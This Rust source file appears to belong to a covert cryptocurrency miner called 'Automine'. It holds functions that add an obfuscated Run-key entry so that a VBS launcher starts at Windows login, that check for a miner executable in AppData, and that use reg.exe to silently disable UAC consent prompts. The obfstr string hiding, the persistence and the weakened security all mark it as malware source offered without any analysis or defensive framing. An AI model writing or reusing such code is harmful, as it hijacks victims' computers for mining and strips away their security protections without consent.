
use std::path::Path;

use crate::utils::paths::get_appdata_dir;

#[cfg(windows)]
use winreg::enums::*;
#[cfg(windows)]
use winreg::RegKey;





#[cfg(windows)]
pub fn add_to_startup(vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let (key, _) = hkcu.create_subkey(obfstr!(r"Software\Microsoft\Windows\CurrentVersion\Run"))?;
    let value = format!(obfstr!(r#"wscript.exe "{}""#), vbs_path.display());
    key.set_value(obfstr!("Automine"), &value)?;
    Ok(())
}

#[cfg(not(windows))]
pub fn add_to_startup(_vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn remove_from_startup() -> Result<(), Box<dyn std::error::Error>> {
    use obfstr::obfstr;
    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    if let Ok(key) = hkcu.open_subkey_with_flags(obfstr!(r"Software\Microsoft\Windows\CurrentVersion\Run"), KEY_SET_VALUE) {
        let _ = key.delete_value(obfstr!("Automine"));
    }
    Ok(())
}

#[cfg(not(windows))]
pub fn remove_from_startup() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}


pub fn is_installed() -> bool {
    let automine_dir = get_appdata_dir();
    let miner_exe = automine_dir.join(crate::common::constants::get_miner_exe_name());
    miner_exe.exists()
}

#[cfg(windows)]
pub fn disable_uac() -> Result<(), Box<dyn std::error::Error>> {
    // Attempt to set ConsentPromptBehaviorAdmin to 0 (Elevate without prompting)
    // and PromptOnSecureDesktop to 0 (No dimming)
    // This requires Admin privileges.
    
    use std::process::Command;
    
    // ConsentPromptBehaviorAdmin = 0
    // ConsentPromptBehaviorAdmin = 0
    let _ = Command::new("reg")
        .args(&[
            "add", obfstr!("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
            "/v", obfstr!("ConsentPromptBehaviorAdmin"),
            "/t", "REG_DWORD",
            "/d", "0",
            "/f"
        ])
        .output();

    // PromptOnSecureDesktop = 0
    let _ = Command::new("reg")
        .args(&[
            "add", obfstr!("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
            "/v", obfstr!("PromptOnSecureDesktop"),
            "/t", "REG_DWORD",
            "/d", "0",
            "/f"
        ])
        .output();

    Ok(())
}

#[cfg(not(windows))]
pub fn disable_uac() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}
